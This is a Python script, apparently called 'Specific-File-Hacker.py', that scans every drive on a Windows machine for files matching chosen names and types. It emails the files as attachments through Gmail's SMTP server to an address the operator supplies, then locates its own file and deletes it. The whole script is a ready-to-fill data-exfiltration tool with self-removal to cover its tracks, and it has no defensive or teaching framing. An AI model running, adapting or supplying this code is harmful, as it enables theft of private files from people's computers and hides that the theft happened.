#----------------------------------------------------------------
# IMPORTS
#----------------------------------------------------------------
# Used to send the emails
import smtplib
from email.message import EmailMessage as email
# Used to find the desired file
import os
import string

#----------------------------------------------------------------
# FUNCTIONS
#----------------------------------------------------------------
# Finds drives on pc
def find_drives():
    file_location = ['%s:' % d for d in string.ascii_uppercase if os.path.exists('%s:' % d)]
    file_location = "".join(file_location).replace(":", ":/[@@]").split("[@@]")
    del file_location[-1]
    return file_location


# Finds file
def findfile(name, extensions, path):
    files = []
    for paths in path:
        for dirpath, dirname, filename in os.walk(paths):
            for item in filename:
                for names in name:
                    if str.lower(names) in str.lower(item):
                        dirpath_and_item = dirpath, item
                        file_stats = os.stat("/".join(dirpath_and_item))
                        file_size = file_stats.st_size / 1000000
                        if extensions:
                            for extension in extensions:
                                if extension.lower() in item.lower() and ".lnk" not in item.lower():
                                    if file_size < file_size_limit and "/".join(dirpath_and_item).lower() not in " ".join(files).lower():
                                        files.append("/".join(dirpath_and_item))
                        else:
                            if ".lnk" not in item.lower() and "/".join(dirpath_and_item).lower() not in " ".join(files).lower() and file_size < file_size_limit:
                                files.append("/".join(dirpath_and_item))
    return files


# Sends email
def send_email():
    msg = email()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = "Files"

    for file in files:
        with open(file, "rb") as data:
            filedata = data.read()
            filename = file.replace("\\", "/").split("/")
            filename = filename[-1]
        msg.add_attachment(filedata, maintype="application", subtype="octet-stream", filename=filename)

    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
        server.login(sender_email, sender_password)
        server.send_message(msg)


#-----------------------------------------------------------
# NEEDED AS BUG WHEN SENDING TEXT FILES AND OTHER FILE TYPES
#-----------------------------------------------------------
# Finds if ".txt" files were found
def text_files():
    text_files = []
    if ".txt" in "".join(files).lower():
        for file in files:
            if ".txt" in file.lower():
                text_files.append(file)
    return text_files


# Sends email if ".txt" files were found
def email_text_files():
    msg = email()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = "Text Files"

    for file in text_files:
        with open(file, "rb") as data:
            filedata = data.read()
            filename = file.replace("\\", "/").split("/")
            filename = filename[-1]
        msg.add_attachment(filedata, maintype="application", subtype="octet-stream", filename=filename)

    with smtplib.SMTP_SSL("smtp.gmail.com", 465) as server:
        server.login(sender_email, sender_password)
        server.send_message(msg)
#-----------------------------------------------------------
# BUG ENDS
#-----------------------------------------------------------    


#-----------------------------------------------------------    
# MAIN PROGRAM
#-----------------------------------------------------------    
# ENTER THESE
file_name = [""] # Enter the name for the file you want to find in a list form
file_type = [""] # Enter the file type (e.g. ".txt") in the form of a list or just leave blank
file_size_limit = 999999999999 # Enter the file size limit in megabytes or just enter a massive number like 999999999999
sender_email = "" # Enter the email you want to send the files from
sender_password = "" # Enter the email's password you want to send the files from
receiver_email = "" # Enter the email you want to receive the data from

file_location = find_drives()
files = findfile(file_name, file_type, file_location)
send_email()
text_files = text_files()
if text_files:
    email_text_files()

# Deletes file afterwards
def findfile(name, path):
    for dirpath, dirname, filename in os.walk(path):
        if name in filename:
            return os.path.join(dirpath, name)


filepath = findfile("Specific-File-Hacker.py", "/")

os.remove(filepath)